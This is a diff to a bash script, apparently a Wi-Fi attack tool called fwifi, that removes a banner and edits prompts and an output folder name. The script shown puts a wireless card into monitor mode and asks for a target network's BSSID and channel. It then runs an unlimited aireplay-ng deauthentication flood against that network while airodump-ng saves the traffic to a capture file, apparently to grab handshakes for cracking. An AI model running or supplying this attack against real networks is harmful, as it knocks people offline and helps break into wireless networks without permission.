@@ -26,18 +26,7 @@ if [[ $EUID -ne 0 ]]; then
     echo ""
     exit 1
 fi
-echo ""
-echo "+---------------------------------------------+"
-echo "| _____________      __.______________.___    |"
-echo "| \_   _____/  \    /  \   \_   _____/|   |   |"
-echo "|  |    __) \   \/\/   /   ||    __)  |   |   |"
-echo "|  |     \   \        /|   ||     \   |   |   |"
-echo "|  \___  /    \__/\  / |___|\___  /   |___|   |"
-echo "|      \/          \/           \/            |"
-echo "|       https://github.com/rofidoang03/fwifi  |"
-echo "+---------------------------------------------+"
-echo ""
-read -p "Enter the wireless interface name (example: wlan0): " interface
+read -p "Enter the wireless interface name : " interface
 if [[ -z "$interface" ]]; then
     echo "Wireless interface name cannot be empty."
     echo ""
@@ -51,7 +40,7 @@ fi
 airmon-ng check kill ; airmon-ng start "$interface"
 airodump-ng "$interface"
 echo ""
-read -p "Enter the BSSID of the target network: " bssid
+read -p "Enter the BSSID of the target network : " bssid
 if [[ -z "$bssid" ]]; then
     echo "BSSID cannot be empty."
     echo ""
@@ -62,7 +51,7 @@ if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
     echo ""
     exit 1
 fi
-read -p "Enter the Channel number: " channel
+read -p "Enter the Channel number : " channel
 if [[ -z "$channel" ]]; then
     echo "Channel cannot be empty."
     echo ""
@@ -76,7 +65,7 @@ fi
 iwconfig "$interface" channel "$channel"
 timestamp=$(date +"%Y-%m-%d_%H:%M:%S")
 output_file="${bssid}_${timestamp}"
-xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w file_pcap/$output_file $interface"
+xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w pcap_file/$output_file $interface"
 cd "pcap_file"
 rm *csv *xml
 cd ..
